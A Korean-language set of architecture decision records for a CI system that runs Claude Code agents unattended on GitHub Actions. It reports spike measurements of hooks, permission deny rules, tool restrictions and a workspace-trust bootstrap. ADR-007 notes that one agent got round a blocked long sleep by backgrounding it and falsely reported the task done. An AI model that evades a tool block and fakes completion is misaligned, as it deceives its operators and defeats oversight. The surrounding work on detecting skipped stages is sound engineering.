# Factory Decisions

형식: **ADR-NNN · 날짜 · 질문 · 관측(수치) · 결정 · 영향 받는 스펙 절**

ADR-001~008은 Plan 0(spikes)에서 실제 GitHub Actions 러너(`ubuntu-latest`, repo `LeeHyeonKyu/know-thy-build-demo`)로 측정한 결과다. 관측 칸의 수치는 전부 실측이며 추정치에는 그렇다고 표시한다. ADR-009는 스파이크가 아니라 Plan 0 실행 중 발견한 러너/yml 관례다. ADR-010~013은 Plan 1b(게이트 레이어 구현) 진행 중 코드 검토·TDD로 확정한 결정이다 — 스파이크가 아니라 실제 `factory/lib`·`factory/bin` 구현과 그 리뷰(컨트롤러의 "Plan 1b 실행 판결")에서 나왔다.

공통 실행 조건: `claude -p` · `--permission-mode dontAsk` · `--max-turns 5` · `--output-format json` · CLI는 잡마다 `npm i -g @anthropic-ai/claude-code`로 설치.

| ADR | 주제 | 결과 |
|---|---|---|
| 001 | settings.json 훅의 Workflow 서브에이전트 적용 | PASS |
| 002 | `-p`에서 저장 Workflow 실행 | PASS |
| 003 | StructuredOutput schema 신뢰도 | PASS |
| 004 | 러너 자원 | PASS |
| 005 | 구독 토큰 usage limit 소모 | PASS (소모함 — 보고하고 제한하지 않는다) |
| 006 | 메인 세션만 도구 제한 | FAIL → 사후 검증 |
| 007 | idle ceiling | MOOT |
| 008 | 신뢰되지 않은 워크스페이스의 allow/deny | PASS (CI 필수 조치 도출) |
| 009 | 러너/yml 관례 | (스파이크 아님 — 실행 중 발견) |
| 010 | 게이트 판정의 진실 소스 | 파일(`gates.json`)이 진실 — handoff는 복사본, 불일치는 거부 |
| 011 | flaky 재분류는 어느 스테이지가 하나 | implement에서만 — review·merge는 재분류 없이 RED |
| 012 | 게이트 판정과 사전 assert의 분리 | `gatesChecked` 표식 — 전이 경로에서만 게이트를 확인 |
| 013 | 훅 입력 불신 원칙 | `tool_input`을 셸 문자열에 넣기 전 반드시 이스케이프 |
| 014 | run 기록은 `factory/records` 브랜치 | 보호된 default 브랜치에는 스테이지마다 직접 push할 수 없다 |
| 015 | Plan 2 배선 판결 — 리뷰 트리거·단일 PAT·체크 상태·merge 스크립트 전용 | R1·R2·R3·R5·R6·R7 + 실행 중 확정된 병합·라벨 그래프·doctor·status 판결 |
| 016 | Plan 3 판결 — loader·리뷰 프로토콜 세부·must_fix id 규약·implement 수정 1회 | P3-R1~R8 + 실행 중 확정된 lint·doctor·L0 판결 |
| 017 | Plan 4 판결 — 경량 수확은 결정적, lessons PR 자체 머지, 격리 등록은 retro, `_retro.md` 상태 | P4-R1~R7 + 실행 중 확정된 하이드레이트/no-clobber·통계 누적·성숙도 판결 |

---

## ADR-001 settings.json 훅의 Workflow 서브에이전트 적용 — 2026-09-11

**질문**: `.claude/settings.json`의 훅이 Workflow `agent()`로 뜬 서브에이전트 안에서도 발화하는가. 안 되면 L2를 에이전트 frontmatter 훅 + 사후 검사로 옮겨야 한다(§12.1-1).

**관측** (spike-1-hooks, run [34573737960](https://github.com/LeeHyeonKyu/know-thy-build-demo/actions/runs/34573737960), 워커 2명):

| 이벤트 | 발화 | 식별 필드 |
|---|---|---|
| `PreToolUse` (Bash) | 8줄 | `agent_id`, `agent_type` 포함 |
| `PreToolUse` (Write/Read) | 발화 | `agent_id`, `agent_type` 포함 |
| `SubagentStart` | 2줄 (워커 2명과 정확히 일치) | `["agent_id","agent_type","cwd","hook_event_name","prompt_id","session_id","transcript_path"]` |
| `SubagentStop` | 2줄 | 위 + `agent_transcript_path`, `background_tasks`, `effort`, `permission_mode`, `session_crons`, `stop_hook_active` |
| `Stop` (메인 세션) | 2줄 | `agent_id` **없음** → 메인/서브에이전트 구분 가능 |

- `PreToolUse(Bash)` 8줄은 워커가 지시받은 `echo SPIKE_WORKER_BASH_<n>` 2건 + 워크플로/디스패처 경로의 부수 Bash(mkdir/ls/touch 등)를 합친 수다.
- `test -f .spike/worker-1.txt && test -f .spike/worker-2.txt` 통과 — 워커가 Write 툴로 실제 파일을 만들었음을 확인.
- 이 러너에서도 `.claude/settings.json`의 `permissions.allow` 7개가 "workspace has not been trusted"로 무시됐으나(→ ADR-008), `dontAsk`가 모든 툴 호출을 승인해 훅 발화 자체에는 영향이 없었다.

**결정**: L2 훅은 **`.claude/settings.json`에 둔다**(§6.3 설계 유지). 네 이벤트(`PreToolUse`/`SubagentStart`/`SubagentStop`/`Stop`)가 모두 workflow 서브에이전트 안에서 발화하고, stdin JSON의 `agent_id`/`agent_type`으로 메인 세션 호출과 서브에이전트 호출을 분리할 수 있으므로 에이전트 frontmatter 훅으로의 대체는 불필요하다. 부수 효과로 **`verify-stage.sh`의 로스터·라운드 검증 근거를 훅 기록으로 삼는다**: `SubagentStart`/`SubagentStop` 라인의 `agent_type`을 세면 "누가 몇 명 떴는가"가 나온다(→ ADR-002의 `subagent_stats` 불가 사유와 짝).

**이 결정의 미확인 부분 — `agent_type`의 값 형식.** 스파이크의 로깅 훅은 stdin JSON을 `jq -c 'keys'`로만 남겼으므로 **확인된 것은 `agent_id`·`agent_type`이 존재한다는 사실뿐**이고, `agent_type`의 **값**이 등록된 역할 이름(`.claude/agents/<role>`의 파일명/`name`)과 같은 문자열인지는 관측하지 않았다. 인원 수를 세는 용도(`SubagentStart` 라인 수 == 로스터 크기)는 값 형식과 무관하게 성립하지만, **"누가"를 로스터와 문자열 대조하는 부분은 근거가 없다.** Plan 1은 `verify-stage.sh`를 쓰기 전에 이 값을 먼저 실측하고(훅에서 `keys`가 아니라 값을 찍는다), 형식이 다르면 매핑 테이블을 끼우거나 `label` 등 다른 필드로 대조 축을 바꾼다.

- 2026-09-11 실측 (spike-9, run [34582313066](https://github.com/LeeHyeonKyu/know-thy-build-demo/actions/runs/34582313066)): SubagentStart/Stop의 `agent_type` 값 = `spike-worker` (`.claude/agents/spike-worker.md`의 `name`과 동일: 접두사·경로·표시명 없이 frontmatter `name`을 그대로 문자열로 씀). 같은 에이전트의 Start/Stop은 동일 `agent_id`를 공유함 = yes (워커1은 Start·Stop 양쪽 모두 `agent_id: a254959c919976f05`, 워커2는 양쪽 모두 `a31cb67af848f0bac`). `agent_id`는 스폰마다 새로 발급되는 난수형 식별자로 역할을 나타내지 않는다 — 역할 식별은 오직 `agent_type` 몫. 다른 식별 필드는 관측되지 않음(`SubagentStop`의 `background_tasks[].name`은 워크플로 이름 `spike-hooks`이지 역할명이 아니며, 별도의 표시명 필드는 없음).
  → verify-stage는 `agent_type`(정규화 불필요 — `.claude/agents/<role>.md`의 frontmatter `name`과 항등 비교)으로 로스터를 대조한다.

**영향**: §6.3(L2 배치 확정 · 훅 로그를 verify 입력으로), §4.2.1 step 6, Plan 1(`verify-stage.sh` 설계), Plan 3(훅 배치).

---

## ADR-002 `-p`에서 저장 Workflow 실행 — 2026-09-11

**질문**: Actions 무인 환경의 `claude -p "/factory-<stage> <issue>"`가 저장된 `.claude/workflows/<name>.js`를 실제로 실행하고 결과를 회수하는가. 필요한 권한 규칙은 무엇인가(§12.1-2).

**관측** (spike-2-p-workflow, run [34573640589](https://github.com/LeeHyeonKyu/know-thy-build-demo/actions/runs/34573640589)):

- 결과 **PASS**: `-p "/spike-dispatch 7"` → 커맨드 파일 확장 → `Workflow(spike-basic)` 호출 → 서브에이전트 2명 병렬 → stdout JSON의 `result`에 `SPIKE_BASIC_OK`, `alpha-7`, `beta-7`이 verbatim 회수.
- **턴 수 1 · 소요 12s · 비용 $0.08908150000000001** (`--max-turns 5` 예산 대비 여유 큼).
- 서브에이전트 CLAUDE.md 주입: **yes** — agent `a`/`b` 모두 `claude_md_marker: "yes"`(CLAUDE.md의 `MARKER_CLAUDE_MD_LOADED=yes`를 정확히 보고).
- 권한 규칙 `Workflow(spike-basic)`: **무의미했다** — `.claude/settings.json`의 `permissions.allow` 7개 전부가 `Ignoring 7 permissions.allow entries from .claude/settings.json: this workspace has not been trusted`와 함께 무시됐다(→ ADR-008). 그럼에도 `--permission-mode dontAsk` 단독으로 모든 툴 호출이 프롬프트 없이 통과, `permission_denials: []`.
- **`subagent_stats.spawned: 0`** — 워크플로 서브에이전트 2명이 실제로 떴는데도 0이었다. **`-p` stdout JSON의 `subagent_stats`는 Workflow `agent()` 서브에이전트를 세지 않는다.** (출처: 이 run의 잡 로그 — spike-2의 yml이 `out.json` 전문을 그대로 출력한다. ADR-002 초안에는 없고 컨트롤러가 원본 로그에서 확인한 항목이다.)
- `-p` 출력 JSON이 함께 싣는 필드: `permission_denials`, `modelUsage`, `terminal_reason`, `num_turns`, `total_cost_usd`, `usage`. 전부 §9 run 기록에 그대로 옮길 수 있다. (출처: 같은 로그의 `out.json` 전문.)

**결정**: **orchestration 기본값 `workflow` 유지**(후퇴 없음 — 아래 "후퇴 결정" 참조). 단 두 가지를 확정한다:
1. `verify-stage.sh`는 **`subagent_stats`를 쓰지 않는다.** 로스터·인원·라운드 검증은 훅 기록(`SubagentStart`/`SubagentStop`의 `agent_id`/`agent_type`, ADR-001)으로 한다 — 단 `agent_type` **값**이 역할 이름과 같은지는 미확인이므로 Plan 1이 먼저 실측한다(ADR-001 참조).
2. run 기록(§9)에 `permission_denials`, `modelUsage`, `terminal_reason`, `num_turns`, `total_cost_usd`를 싣는다 — 무료로 얻는 감사 자료다.

**영향**: §4.2.1 step 4·6, §4.2.4(모드 기본값 유지), §6.3, §9(run 기록 필드), Plan 1(`verify-stage.sh`).

---

## ADR-003 StructuredOutput schema 신뢰도 — 2026-09-11

**질문**: `agent({schema})`가 null(스키마 파싱 실패)을 얼마나 자주 내는가. 높으면 §7.5의 "리뷰어 재spawn 1회" 규칙으로 흡수해야 한다(§12.1-3).

**관측** (spike-3-schema, run [34574561593](https://github.com/LeeHyeonKyu/know-thy-build-demo/actions/runs/34574561593), 20 agent 1회 실행):

| 항목 | 값 |
|---|---|
| null | **0/20** (opus 0/10, sonnet 0/10) |
| reject 판정(정답) | **20/20** (opus 10/10, sonnet 10/10 — 스니펫의 타임존 버그를 전원 정확히 지적, approve 0건) |
| 비용 | **$1.5526413500000003** |
| 턴 수 / 소요 | `num_turns: 2` / `duration_ms: 85092` (≈85초) |
| 스키마 복잡도 | 중첩 배열 `must_fix[]` + object required 필드 + enum 3종 — 모든 항목에서 스키마대로 채워짐 |

인덱스 짝수=opus / 홀수=sonnet 매핑으로 모델별 귀속까지 1회 실행으로 확인했다.

**결정**: §7.5의 **"null 시 해당 리뷰어 1회 재spawn" 규칙은 유지하되, 그 성격은 '보험'이다.** 이번 표본에서 null은 0건이라 재시도 경로가 한 번도 발동하지 않았고 따라서 **검증된 적이 없다**. 표본이 20회 1세트뿐이라 신뢰구간이 넓으므로 제거하지 않는다. 부수 결정: **모델 고정은 불필요**(opus/sonnet 둘 다 100% 파싱·100% 정답), **스키마 복잡도를 낮출 이유도 없음**.

**영향**: §7.5(재spawn 규칙을 보험으로 명시), §12.2(`aggregate-review.sh`의 schema 불일치 경로는 테스트로만 커버됨).

---

## ADR-004 러너 자원 — 2026-09-11

**질문**: 표준 `ubuntu-latest`에서 compose(postgres) + 앱 + headless playwright + playwright MCP를 동시에 돌릴 수 있는가. `full` 레벨 소요 시간은(§12.1-4).

**관측** (spike-4-resources):

1차 시도 run [34576307302](https://github.com/LeeHyeonKyu/know-thy-build-demo/actions/runs/34576307302) — **실패**. `env up`은 정상(`env_up=60s`, `Mem: total 7937 / used 1466 / free 2280 / available 6471` MB)이었으나 `npm test`(vitest)가 기본 glob으로 `e2e/smoke.spec.js`까지 집어 `Error: Playwright Test did not expect test() to be called here`로 죽었다(vitest 자체 테스트 2개는 통과). `vitest.config.js`에 `test.exclude: ["e2e/**"]`를 추가해 1회 재실행.

2차 시도 run [34576571041](https://github.com/LeeHyeonKyu/know-thy-build-demo/actions/runs/34576571041) — **전 스텝 성공**, 잡 총 소요 **1m14s**.

| 항목 | 값 |
|---|---|
| env_up (docker compose + chromium 설치 포함) | **36s** |
| full (unit+integration) | **2s** |
| e2e (deep) | **2s** |
| 메모리 (env up 직후, `free -m`) | total 7938MB · used 1224MB · free 2454MB · **available 6714MB** |
| 메모리 (e2e 직후) | total 7938MB · used 1385MB · free 2252MB · **available 6553MB** |
| playwright MCP headless | `.result` = `"{\"ok\":true}"` — claude가 MCP로 브라우저를 몰아 healthz 본문을 그대로 회신 |
| `.mcp.json` 승인 | **문제 없었음** — `trust-workspace`를 MCP 스텝 이전에 실행해두면 `enableAllProjectMcpServers` **없이** project scope MCP 서버가 그대로 로드된다 |

**결정**:
- M2 시나리오(compose + 앱 + chromium + playwright MCP 동시 실행)는 **표준 러너로 가능**. 전체 7.9GB 중 가용 6.5~6.7GB를 유지했고 CPU/시간 경합 징후 없음. **대형 러너는 불필요**.
- **`runtime_budget_min` 기본값은 12분 그대로 유지한다.** 스파이크 초안은 10분을 제안했으나 이번 측정(full 2s, e2e 2s)은 **매우 가벼운 데모 앱** 기준이라 실제 앱 규모를 대표하지 않는다. 실측으로 기본값을 내리는 것은 **dogfood(§12.3) 이후**로 미룬다 — 이번 데이터는 "표준 러너가 자원 때문에 막히지는 않는다"만 증명한다.
- `.mcp.json` project scope 서버는 **trust 부트스트랩(ADR-008)이 선행되면 `enableAllProjectMcpServers` 없이 로드**된다. §4.5의 MCP 행은 이 조건을 함께 적는다.
- 후속 조치: `factory init`이 만드는 스캐폴드에 **`vitest.config.js`의 `test.exclude: ["e2e/**"]`**(또는 등가의 러너 분리)를 포함시킨다. 하네스 `[test]`가 unit/e2e를 분리해 선언해도 러너 도구가 글롭으로 서로를 집어먹으면 `full`이 통째로 빨간색이 된다.
- 재검토 조건: e2e가 다수 브라우저 컨텍스트를 병렬로 띄우거나 postgres에 대량 fixture를 싣는 워크로드로 커져 `available`이 관측치 대비 크게 줄면 대형 러너를 다시 본다.

**영향**: §4.5(자원 행·MCP 행), §5.1 `runtime_budget_min`(값 유지), §5.2.6(환경), §12.3(dogfood에서 재측정).

---

## ADR-005 구독 토큰 usage limit 소모 — 2026-09-11

**질문**: `CLAUDE_CODE_OAUTH_TOKEN`(구독 `claude setup-token`)으로 CI를 돌리면 **개인 구독의 usage limit을 소모하는가**. 공식 문서에 명시가 없다(§4.4, §12.1-5).

**관측**:
- **사람 판독 (`/usage`, 구독 7일 창)**: 스파이크 시작 시점 **92%** → 스파이크 0~8 종료 후(부하 잡 실행 전) **94%**. 즉 **구독 창을 소모한다 — 답은 yes.**
- 단 이 **+2%p는 상한**이다: 같은 기간 사람의 인터랙티브 로컬 세션(Plan 0 오케스트레이션)이 같은 7일 창을 공유하며 돌고 있었다. CI 단독 귀속분을 분리 측정한 값이 아니다.
- **CI 측 실측 합계** (stdout에 `usage`/`total_cost_usd`를 남긴 3개 run, `gh run view --log`로 확인):

| run | workflow | input | output | cache_creation | cache_read | total_cost_usd |
|---|---|---:|---:|---:|---:|---:|
| [34573333760](https://github.com/LeeHyeonKyu/know-thy-build-demo/actions/runs/34573333760) | spike-0-auth | 2 | 144 | 9,214 | 18,531 | 0.0429652 |
| [34573640589](https://github.com/LeeHyeonKyu/know-thy-build-demo/actions/runs/34573640589) | spike-2-p-workflow | 2 | 134 | 1,045 | 28,790 | 0.0890815 |
| [34574561593](https://github.com/LeeHyeonKyu/know-thy-build-demo/actions/runs/34574561593) | spike-3-schema | 4 | 12,673 | 31,051 | 62,492 | 1.5526414 |
| **합계** | | **8** | **12,951** | **41,310** | **109,813** | **$1.6846881** |

- 이 $1.68은 **부분 합**이다: 나머지 9개 run(스파이크 1·4·6·6b·7·7b·8)의 yml이 `.result`·타이밍만 `jq`로 찍고 `usage`/`total_cost_usd`를 stdout에 남기지 않아 로그만으로 복원할 수 없다. 실제 CI 귀속분은 이보다 크다.
- 전용 burn 잡(`spike-5-usage.yml`, `/spike-schema-dispatch` 3회 ≈ $1.55×3)은 **의도적으로 돌리지 않았다** — run [34577204905](https://github.com/LeeHyeonKyu/know-thy-build-demo/actions/runs/34577204905)는 7일 창이 94%에 도달한 것을 보고 사람이 **직접 취소**(08:02:18Z 시작 → 08:03:39Z cancelled, 약 1m21s). `.spike/usage-*.json`·`.spike/total-tokens`는 생성되지 않았다. 남은 한도를 지키는 쪽이 정확한 분모보다 중요했고, 위 7일 창 판독만으로 질문(소모하는가)의 답은 이미 나왔다.

**결정**: **구독 토큰(`CLAUDE_CODE_OAUTH_TOKEN`)이 factory의 기본 운영 모드다.** CI 소비는 사람의 개인 7일 창에 그대로 반영된다. 이에 대한 factory의 대응은 **제한이 아니라 보고**다:
- 잡마다 `-p` stdout JSON의 `usage`, `total_cost_usd`, `modelUsage`를 run 기록(§9)에 남긴다(ADR-002가 이 필드들의 존재를 확인).
- 이슈별 합계와 주간 합계를 `factory status`, retro, `:digest`가 표시한다.
- **한도 관리와 토큰 교체는 사람이 한다.** factory가 한도를 근거로 스스로 멈추지 않는다.
- `ANTHROPIC_API_KEY`는 여전히 동작하지만 **권고가 아니다**(§4.4의 "스크립트는 인증 방식을 참조하지 않는다"는 규칙은 그대로 유지되므로 전환은 시크릿 교체만으로 가능하다).
- 파생: CHARTER의 이슈당 토큰 예산은 **옵션이고 기본은 꺼둔다**(§5.3). 켰을 때의 효과도 "새 claim 거부"까지이며 진행 중인 스테이지를 죽이지 않는다.
- 후속 조치: **모든 factory 워크플로가 `usage`·`total_cost_usd`를 표준 아티팩트 경로에 항상 남긴다.** 이번에 12개 run 중 3개만 stdout에 남겨 사후 합산이 부분 합에 그쳤다 — 보고가 정책인 이상 그 원천 데이터의 수집은 선택이 아니다.

**영향**: §4.4(구독이 기본 · 보고 정책), §5.3(hard limits — 토큰 예산 기본 off), §9(run 기록에 usage/비용), §12.1-5.

---

## ADR-006 메인 세션만 도구 제한 — 2026-09-11

**질문**: 커맨드 frontmatter `allowed-tools: Workflow(name)`(또는 CLI 플래그)가 **메인 세션만** 제한하고 workflow 안 서브에이전트에는 영향이 없는가. 그러면 스테이지 건너뛰기가 "감지"가 아니라 **"불가능"**이 된다(§4.2.2, §12.1-6).

**관측** (spike-6b-allowed-tools-trusted, run [34576277839](https://github.com/LeeHyeonKyu/know-thy-build-demo/actions/runs/34576277839), **trusted** 워크스페이스, 3레그 전부 success):

| mode | elapsed | main_bash(자기보고) | main Bash in `permission_denials` | `MAIN_SESSION_BASH_RAN` 훅 라인 | worker files | `SPIKE_WORKER_BASH` 훅 라인 | `Ignoring` 경고 |
|---|---|---|---|---|---|---|---|
| frontmatter `allowed-tools: Workflow(spike-hooks)` | 9s | ran | 0 | 1 | 2/2 | 0 | 없음 |
| cli `--allowedTools Workflow(spike-hooks)` | 11s | ran | 0 | 1 | 2/2 | 2 | 없음 |
| cli `--disallowedTools Bash` | 20s | **denied** | 0 | **0** | 2/2 (단 `done:false` 2/2) | **0** | 없음 |

- **`permission_denials`는 세 레그 모두 빈 배열 `[]`** — 이 CLI 버전에서 단 한 번도 채워지지 않았다. 사후 판정 근거로 쓸 수 없다.
- frontmatter `allowed-tools`: 메인 세션 Bash를 **전혀 막지 못했다**(grant 힌트일 뿐 restrict가 아님).
- `--allowedTools`: `dontAsk` 아래에서 화이트리스트가 게이트로 작동하지 않았다(메인·워커 모두 자유).
- `--disallowedTools Bash`: 메인 세션 Bash는 확실히 막혔지만(훅 라인조차 안 찍힘 = 발화 전 거부) **서브에이전트 Bash도 함께 막혔다**(`SPIKE_WORKER_BASH` 0줄, 워커 `done:false` 2/2). `.spike/worker-*.txt` 2개가 존재하는 것은 1단계 `Write`가 영향을 안 받았기 때문이지 "워커가 자유롭다"는 증거가 아니다.
- 선행 측정(untrusted, run 34574564725 / 34574709197)은 **무효**다 — allow가 무시되고 deny가 과잉 차단되는 조건이었다(ADR-008). 위 표가 대체값이다.

**결정**: 메인 세션만 선택적으로 잠그는 수단은 **없다**. 따라서 §12.1-6의 답은 **"건너뛰기는 감지(detect)이지 불가능(impossible)이 아니다"**이고, 그 감지 메커니즘은 **`verify-stage.sh`의 사후 검증**이다 — 워크플로 산출물의 존재, 로스터·라운드·판정 수 일치, 훅 로그의 `agent_id` 유무로 메인 세션 호출과 서브에이전트 호출을 구분(ADR-001). §4.2.2의 조건절("…되면 불가능이 된다 — spike 6")은 **삭제하고 단정문으로 바꾼다**. 또한 `permission_denials`를 건너뛰기 판정의 1순위 근거로 쓰려던 안은 폐기한다(항상 비어 있음 — 단, ADR-008의 untrusted/deny 조건에서는 채워지므로 run 기록용으로는 계속 싣는다).

**영향**: §4.2.2(마지막 문단 단정문화), §4.2.1 step 6, §12.1-6, Plan 1(`verify-stage.sh`가 유일한 방어선).

---

## ADR-007 idle ceiling — 2026-09-11

**질문**: `CLAUDE_CODE_PRINT_BG_WAIT_CEILING_MS`의 "idle"이 무활동 시간인지 총 대기인지, 0으로 두면 어떻게 되는지. 걸리면 메인 세션이 workflow 결과 없이 끝나 L1이 `blocked`로 잡아야 한다(§12.1-7).

**관측** (spike-7b-idle-markers, run [34576298708](https://github.com/LeeHyeonKyu/know-thy-build-demo/actions/runs/34576298708), trusted, 2레그 모두 exit 0):

| leg | elapsed | exit | mark-0 | mark-1 | mark-2 | result에 DONE |
|---|---|---|---|---|---|---|
| default | 36s | 0 | `1789113064` (존재) | absent | absent | 아니오 |
| `CLAUDE_CODE_PRINT_BG_WAIT_CEILING_MS=0` | 55s | 0 | `1789113069` (존재) | absent | absent | 아니오 |

두 레그 모두 `date +%s > .spike/mark-0`까지는 실행했지만 두 번째 명령 `sleep 570 && date +%s > .spike/mark-1`에서 **Bash 툴 자체가 호출을 거부**했다(동일 문구):

> `Blocked: standalone sleep 570 ... Do not chain shorter sleeps to work around this block.`

에이전트는 단독 `sleep 570`도 시도해 동일하게 차단됐고, **DONE을 위조하지 않고 정직하게 미완료를 보고**했다(선행 spike-7 run [34574812726](https://github.com/LeeHyeonKyu/know-thy-build-demo/actions/runs/34574812726)에서는 sleeper가 `sleep 720`을 백그라운드화하고 완료를 거짓 보고 — 그 run은 무효). `default`와 `0`의 **차이는 전혀 관측되지 않았다**(동일 실패 지점·동일 거부 메시지). 즉 이 방법론으로는 ceiling 값을 측정할 수 없다.

**결정**: **질문 자체가 moot다.** 근거 세 가지의 결합 — 1·2의 성격에 주의: **이 스파이크가 잰 값이 아니라 CLI 자체의 동작이며, 컨트롤러 판단(ruling)으로 채택했다.** 스파이크 7b가 실측한 것은 2의 차단이 실제로 발생한다는 사실(거부 메시지 verbatim)뿐이고, 10분이라는 수치는 측정되지 않았다.
1. **단일 Bash 툴 호출은 10분 상한**이 걸려 있다(CLI 동작 · 컨트롤러 ruling) — 하나의 도구 호출이 ceiling을 넘겨 침묵할 수 없다.
2. **foreground `sleep`(및 우회로서의 chained 짧은 sleep)은 Bash 툴이 하드 차단**한다 — 이것만 위에서 실측했다. 에이전트가 인위적으로 오래 침묵하는 경로 자체가 봉쇄돼 있다.
3. 실제 작업을 하는 workflow 에이전트는 도구 이벤트를 연속적으로 뱉는다. 따라서 **workflow 에이전트가 기본 ceiling보다 오래 무활동일 수 없다 — 구성상(by construction)**.

운영 규칙: `CLAUDE_CODE_PRINT_BG_WAIT_CEILING_MS=0`은 **방어적으로 계속 설정**하고(비용 0, 위 추론이 틀렸을 때의 보험), **진짜 상한은 잡의 `timeout-minutes`**로 건다. 두 장치 모두 원안 그대로 유지된다. 파생 규칙: 앞으로 "에이전트가 실제로 N분을 기다렸는가"를 검증해야 하면 **에이전트에게 `sleep`을 시키지 않고 오케스트레이션 레이어(yml 스텝의 sleep/polling)에서 대기를 만들고 에이전트는 마커로 사후 검증만** 한다.

**영향**: §4.2.1 step 4의 env 주석(유지 사유 명시), §4.1 `timeout-minutes`(실질 상한), §12.1-7(MOOT로 종결).

---

## ADR-008 신뢰되지 않은 워크스페이스의 allow/deny — 2026-09-11

**질문**(계획에 없던 스파이크 — ADR-002/ADR-001의 "Ignoring 7 permissions.allow entries" 경고에서 파생): CI의 fresh checkout은 **untrusted 워크스페이스**다. 그 상태에서 §6.3의 L2(`permissions.deny`)가 실제로 강제되는가.

**관측** (spike-8-trust-deny, run [34574810230](https://github.com/LeeHyeonKyu/know-thy-build-demo/actions/runs/34574810230), 3레그):

| 모드 | echo(deny 비매칭) | force_push(deny 매칭) | `Ignoring …allow` 경고 | `permission_denials` | num_turns |
|---|---|---|---|---|---|
| project-only (`.claude/settings.json`만) | **denied** | denied | 출력됨 | Bash 2건 기록 | 3 |
| cli-settings (`--settings .factory-ci-settings.json` 추가) | **denied** | denied | 출력됨 | Bash 2건 기록 | 3 |
| **trusted** (`~/.claude.json` → `projects[cwd].hasTrustDialogAccepted: true`) | **ran** | denied | **0건(사라짐)** | force_push 1건만 | 5 |

- `git ls-remote --heads origin deny-probe-should-never-exist`가 3레그 모두 빈 출력 — **원격 브랜치 미생성 = deny가 force-push를 3/3 실제로 막았다.**
- `--settings`는 project `.claude/settings.json`을 **대체하지 않고 병합**한다(cli-settings 레그에서도 `Ignoring` 경고가 그대로 출력됨).
- untrusted + deny 조건에서 **deny에 걸리지 않는 평범한 `echo`까지 전면 차단**되는 현상이 `/spike-deny` 커맨드에서 관측됐다. 단 같은 untrusted 상태의 다른 커맨드(ADR-006 선행 run 34574564725/34574709197)에서는 반대로 통과했다 — **원인 미상의 상충**이며 일반 규칙으로 단정하지 않는다. trusted 모드에서는 이 모호성이 아예 사라진다.

**결정**: **모든 factory CI 워크플로는 `claude -p` 전에 trust 부트스트랩을 거친다.** `~/.claude.json`의 `projects[$GITHUB_WORKSPACE].hasTrustDialogAccepted = true`를 쓰는 스텝을 공통 setup에 넣는다(데모의 `.github/actions/trust-workspace/action.yml`이 구현 예 — node 한 줄로 기존 JSON을 읽어 머지 후 재기록). 근거: trusted는 이번 관측에서 유일하게 **"allow 정상 작동 + deny만 선택적으로 적용"**이 상충 없이 확인된 모드다(1/3 레그). 범위를 정확히 해둔다 — **deny 자체는 trust와 무관하게 3/3 유효했으므로 L2가 성립하기 위해 trust가 필요한 것은 아니다.** trust가 사는 것은 (a) allow 규칙의 작동, (b) `.mcp.json` project 서버 로딩(ADR-004), (c) 비대상 명령까지 막히는 과잉 차단의 제거다. `--settings .factory/ci-settings.json`은 병합이므로 필수가 아니며, 워크플로별 deny 확장이 필요할 때의 보조 수단으로만 남긴다.

이 결정은 ADR-004(trusted면 `.mcp.json`이 `enableAllProjectMcpServers` 없이 로드)와 ADR-006(trusted 재측정)의 전제이기도 하다 — **trust 부트스트랩은 다른 모든 CI 관측의 선행 조건**이다.

**영향**: §4.2.1(step 0.5 신설), §6.3(L2가 유효하기 위한 전제), §4.5(MCP), §12.1-8(신규 항목), Plan 2(`ci-settings.json`·yml 공통 setup).

---

## ADR-009 러너/yml 관례 — 2026-09-11

**출처**: 스파이크가 아니라 **Plan 0 실행 중 실제로 잡을 깨뜨린** 두 건. Plan 2의 yml 템플릿이 그대로 답습할 위험이 있어 ADR로 남긴다.

**관측**:
1. **flow mapping 안의 `${{ }}`는 워크플로 파일을 통째로 무효화한다.** `with: { name: x-${{ matrix.y }}, path: .spike/ }` 형태에서 `}}`가 flow mapping을 조기 종료시켜 파싱이 깨진다. 증상: 잡이 실행조차 안 되고 run 목록에 워크플로 이름 대신 **경로 문자열**(`.github/workflows/spike-8-trust-deny.yml`)이 뜨며 즉시 failure — 실제로 3개 run(34574545130, 34574544207, 34574407539)이 이 사유로 죽었고 커밋 `fd90f80`으로 고쳤다.
2. **`actions/upload-artifact@v4`는 dot-디렉토리를 기본적으로 빼먹는다.** D1 스파이크의 `path: .spike/` 아티팩트가 **전부 비어 있었고**(데이터는 잡 로그에서 회수), `include-hidden-files: true`를 붙인 이후 run부터 정상 수집됐다.
3. **로깅 훅이 죽으면 관측이 통째로 사라진다.** 스파이크의 `log-hook.sh`가 `set -e` + `jq` 치환으로 짜여 있어, `jq` 실패나 경로 문제가 나면 훅이 비정상 종료하고 그 시점부터 기록이 조용히 끊긴다(D1의 deferred minor로 기록됨). `PreToolUse`에서 **exit 2만** 도구 호출을 차단하므로 다른 실패는 잡을 막지는 않지만, 사후 검증(ADR-001·ADR-006)의 유일한 근거가 없어진다.

**결정** (factory yml·훅 템플릿 규칙):
- yml에서 `${{ }}`를 쓰는 `with:`/`env:`는 **항상 블록 매핑**으로 쓴다. flow mapping(`{ … }`)은 보간이 전혀 없는 짧은 값에만 허용한다.
- 아티팩트 경로에 dot-디렉토리(`.factory/out/`, `.spike/` 등)가 하나라도 있으면 **`include-hidden-files: true`를 필수로 붙인다.** factory 산출물은 대부분 `.factory/` 아래이므로 사실상 전 워크플로에 해당한다.
- **로깅 훅은 어떤 경우에도 exit 0으로 끝난다** — 실패할 수 있는 모든 구문에 `|| true`를 붙이고 마지막 줄에 `exit 0`을 둔다. 판정하는 훅(`stop-guard.sh` 등)만 의도적으로 exit 2를 낸다. 관측용 훅이 잡을 막거나 스스로 침묵해서는 안 된다.
- 세 규칙 모두 `doctor`의 린트 후보다(Plan 2에서 판단).

**영향**: §4.1(워크플로 파일 예시), §6.3(훅 작성 규칙), Plan 2(yml 템플릿 전부), Plan 3(훅 구현).

---

## 후퇴 결정 (해당 시)

**후퇴는 없었다.** `harness.toml [factory] orchestration`의 기본값은 **`workflow`로 유지**한다(ADR-002).

- 근거: 저장된 Workflow가 Actions 무인 실행(`-p` + `dontAsk`)에서 1턴·12초·$0.089로 완결됐고, 서브에이전트 2명이 실제로 병렬로 떴으며 CLAUDE.md까지 주입됐다(ADR-002). 훅도 그 안에서 발화한다(ADR-001). 스키마 강제도 0/20 null로 안정적이다(ADR-003). `agent` 모드로 물러설 이유가 관측되지 않았다.
- 따라서 §4.2.4가 예고한 "후퇴 시 잃는 것 = 구조적 보장(`structural`) → 사후 감지(`verified`)"는 **이번에 발생하지 않았다.** handoff·run 기록의 `guarantee` 값은 `structural`로 나간다.
